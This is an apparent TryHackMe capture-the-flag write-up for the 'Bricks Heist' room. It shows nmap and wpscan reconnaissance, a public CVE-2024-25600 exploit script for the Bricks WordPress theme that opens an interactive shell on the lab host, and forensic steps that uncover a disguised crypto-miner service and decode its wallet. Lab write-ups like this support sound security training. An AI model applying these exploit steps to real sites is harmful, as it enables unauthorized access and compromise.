# TryHack3M: Bricks Heist

## Description

*Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.*

From Three Million Bricks to Three Million Transactions!

Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.

Can you hack back the server and identify what happened there?

Note: Add 10.10.85.253 bricks.thm to your /etc/hosts file.

## Challenges

1. What is the content of the hidden .txt file in the web folder?

`nmap -A -v -T4 10.10.85.253`

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-28 03:42 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Initiating NSE at 03:42
Completed NSE at 03:42, 0.00s elapsed
Initiating ARP Ping Scan at 03:42
Scanning 10.10.85.253 [1 port]
Completed ARP Ping Scan at 03:42, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:42
Completed Parallel DNS resolution of 1 host. at 03:42, 0.00s elapsed
Initiating SYN Stealth Scan at 03:42
Scanning ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253) [1000 ports]
Discovered open port 443/tcp on 10.10.85.253
Discovered open port 3306/tcp on 10.10.85.253
Discovered open port 22/tcp on 10.10.85.253
Discovered open port 80/tcp on 10.10.85.253
Completed SYN Stealth Scan at 03:42, 1.26s elapsed (1000 total ports)
Initiating Service scan at 03:42
Scanning 4 services on ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
Completed Service scan at 03:43, 73.17s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
adjust_timeouts2: packet supposedly had rtt of -175270 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175270 microseconds.  Ignoring time.
Retrying OS detection (try #2) against ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
Retrying OS detection (try #3) against ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
Retrying OS detection (try #4) against ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
adjust_timeouts2: packet supposedly had rtt of -150400 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -150400 microseconds.  Ignoring time.
Retrying OS detection (try #5) against ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
NSE: Script scanning 10.10.85.253.
Initiating NSE at 03:44
Completed NSE at 03:44, 1.47s elapsed
Initiating NSE at 03:44
Completed NSE at 03:44, 0.00s elapsed
Nmap scan report for ip-10-10-85-253.eu-west-1.compute.internal (10.10.85.253)
Host is up (0.00037s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Tue, 28 May 2024 02:42:48 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Tue, 28 May 2024 02:42:48 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http Apache httpd
|_http-generator: WordPress 6.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Brick by Brick
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-02T11:59:14
| Not valid after:  2025-04-02T11:59:14
| MD5:   f1df 99bc d5ab 5a5a 5709 5099 4add a385
|_SHA-1: 1f26 54bb e2c5 b4a1 1f62 5ea0 af00 0261 35da 23c3
3306/tcp open  mysql    MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.60%I=7%D=5/28%Time=665544A8%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20
SF:WebSockify\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2028\x20May\x202024\x20
SF:02:42:48\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;c
SF:harset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20Al
SF:lowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explan
SF:ation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20th
SF:is\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOption
SF:s,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nSe
SF:rver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2028\x20May\x2
SF:02024\x2002:42:48\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupporte
SF:d\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20Se
SF:rver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x20
SF:\x20</body>\n</html>\n");
MAC Address: 02:CA:71:8F:3F:F7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/28%OT=22%CT=1%CU=43584%PV=Y%DS=1%DC=D%G=Y%M=02CA71%T
OS:M=665544FD%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

Check `https://bricks.thm/robots.txt` - There is Wordpress

`wpscan --url https://bricks.thm --disable-tls-checks`

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: https://bricks.thm/ [10.10.85.253]
[+] Started: Tue May 28 03:51:28 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - Upgrade: h2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Tue May 28 03:51:39 2024
[+] Requests Done: 181
[+] Cached Requests: 7
[+] Data Sent: 38.948 KB
[+] Data Received: 21.09 MB
[+] Memory used: 287.984 MB
[+] Elapsed time: 00:00:10
```

Check for Version: 1.9.5 exploit - https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
Install requirements

`python3.9 CVE-2024-25600.py -u https://bricks.thm`

```

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php

Shell> cat 650c844110baced87e1606453b93f22a.txt
```

3. What is the service name affiliated with the suspicious process?

`systemctl | grep running`

```
roc-sys-fs-binfmt_misc.automount                loaded active     running         Arbitrary Executable File Formats File System Automount Point                
  acpid.path                                       loaded active     running         ACPI Events Check                                                            
  init.scope                                       loaded active     running         System and Service Manager                                                   
  session-c1.scope                                 loaded active     running         Session c1 of user lightdm                                                   
  accounts-daemon.service                          loaded active     running         Accounts Service                                                             
  acpid.service                                    loaded active     running         ACPI event daemon                                                            
  atd.service                                      loaded active     running         Deferred execution scheduler                                                 
  avahi-daemon.service                             loaded active     running         Avahi mDNS/DNS-SD Stack                                                      
  cron.service                                     loaded active     running         Regular background program processing daemon                                 
  cups-browsed.service                             loaded active     running         Make remote CUPS printers available locally                                  
  cups.service                                     loaded active     running         CUPS Scheduler                                                               
  dbus.service                                     loaded active     running         D-Bus System Message Bus                                                     
  getty@tty1.service                               loaded active     running         Getty on tty1                                                                
  httpd.service                                    loaded active     running         LSB: starts Apache Web Server                                                
  irqbalance.service                               loaded active     running         irqbalance daemon                                                            
  kerneloops.service                               loaded active     running         Tool to automatically collect and submit kernel crash signatures             
  lightdm.service                                  loaded active     running         Light Display Manager                                                        
  ModemManager.service                             loaded active     running         Modem Manager                                                                
  multipathd.service                               loaded active     running         Device-Mapper Multipath Device Controller                                    
  mysqld.service                                   loaded active     running         LSB: start and stop MySQL                                                    
  networkd-dispatcher.service                      loaded active     running         Dispatcher daemon for systemd-networkd                                       
  NetworkManager.service                           loaded active     running         Network Manager                                                              
  polkit.service                                   loaded active     running         Authorization Manager                                                        
  rsyslog.service                                  loaded active     running         System Logging Service                                                       
  rtkit-daemon.service                             loaded active     running         RealtimeKit Scheduling Policy Service                                        
  serial-getty@ttyS0.service                       loaded active     running         Serial Getty on ttyS0                                                        
  snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running         Service for snap application amazon-ssm-agent.amazon-ssm-agent               
  snapd.service                                    loaded active     running         Snap Daemon                                                                  
  ssh.service                                      loaded active     running         OpenBSD Secure Shell server                                                  
  switcheroo-control.service                       loaded active     running         Switcheroo Control Proxy service                                             
  systemd-journald.service                         loaded active     running         Journal Service                                                              
  systemd-logind.service                           loaded active     running         Login Service                                                                
  systemd-networkd.service                         loaded active     running         Network Service                                                              
  systemd-resolved.service                         loaded active     running         Network Name Resolution                                                      
  systemd-timesyncd.service                        loaded active     running         Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running         udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running         TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running         Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running         Unattended Upgrades Shutdown                                                 
  upower.service                                   loaded active     running         Daemon for power management                                                  
  user@1000.service                                loaded active     running         User Manager for UID 1000                                                    
  user@114.service                                 loaded active     running         User Manager for UID 114                                                     
  whoopsie.service                                 loaded active     running         crash report submission daemon                                               
  wpa_supplicant.service                           loaded active     running         WPA supplicant                                                               
  acpid.socket                                     loaded active     running         ACPID Listen Socket                                                          
  avahi-daemon.socket                              loaded active     running         Avahi mDNS/DNS-SD Stack Activation Socket                                    
  cups.socket                                      loaded active     running         CUPS Scheduler                                                               
  dbus.socket                                      loaded active     running         D-Bus System Message Bus Socket                                              
  multipathd.socket                                loaded active     running         multipathd control socket                                                    
  snapd.socket                                     loaded active     running         Socket activation for snappy daemon                                          
  syslog.socket                                    loaded active     running         Syslog Socket                                                                
  systemd-journald-audit.socket                    loaded active     running         Journal Audit Socket                                                         
  systemd-journald-dev-log.socket                  loaded active     running         Journal Socket (/dev/log)                                                    
  systemd-journald.socket                          loaded active     running         Journal Socket                                                               
  systemd-networkd.socket                          loaded active     running         Network Service Netlink Socket                                               
  systemd-udevd-control.socket                     loaded active     running         udev Control Socket                                                          
  systemd-udevd-kernel.socket                      loaded active     running         udev Kernel Socket                                                           
  motd-news.timer                                  loaded active     running         Message of the Day
```

2. What is the name of the suspicious process?

`systemctl status ubuntu.service`

```
\u25cf ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2024-05-28 04:08:05 UTC; 5s ago
   Main PID: 64237 (nm-inet-dialog)
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/ubuntu.service
             \u251c\u250064237 /lib/NetworkManager/nm-inet-dialog
             \u2514\u250064238 /lib/NetworkManager/nm-inet-dialog
```

`systemctl cat ubuntu.service`

```
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

4. What is the log file name of the miner instance?

`ls -la /lib/NetworkManager`

```
total 8636
drwxr-xr-x   6 root root    4096 Apr  8 10:46 .
drwxr-xr-x 148 root root   12288 Apr  2 10:17 ..
drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
drwxr-xr-x   2 root root    4096 Apr  3 06:39 conf.d
drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
-rw-r--r--   1 root root   48190 Apr 11 10:54 inet.conf
-rwxr-xr-x   1 root root   14712 Feb 16 17:36 nm-dhcp-helper
-rwxr-xr-x   1 root root   47672 Feb 16 17:36 nm-dispatcher
-rwxr-xr-x   1 root root  843048 Feb 16 17:36 nm-iface-helper
-rwxr-xr-x   1 root root 6948448 Apr  8 10:28 nm-inet-dialog
-rwxr-xr-x   1 root root  658736 Feb 16 17:36 nm-initrd-generator
-rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
-rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
-rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
-rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
-rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
```

5. What is the wallet address of the miner instance?

`head -n 10 /lib/NetworkManager/inet.conf`

```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
```

Check in Cyberchef `5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d` -> From HEX -> From base64 -> From base64

6. The wallet address used has been involved in transactions between wallets belonging to which threat group?

Check this address on `https://www.blockchain.com`

Check 'FROM' address - `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` in internet -> https://www.opensanctions.org/entities/ofac-4d99af7cc172df2b9fbb833cb5af39dbbc011a2c/

Read about Ivan Gennadievich Kondratiev -> `https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://home.treasury.gov/news/press-releases/jy2114&ved=2ahUKEwiOpOPeua-GAxUmWEEAHQy0DQEQFnoECB4QAQ&usg=AOvVaw3k1BpmioedG72Z1jJyuM7s`

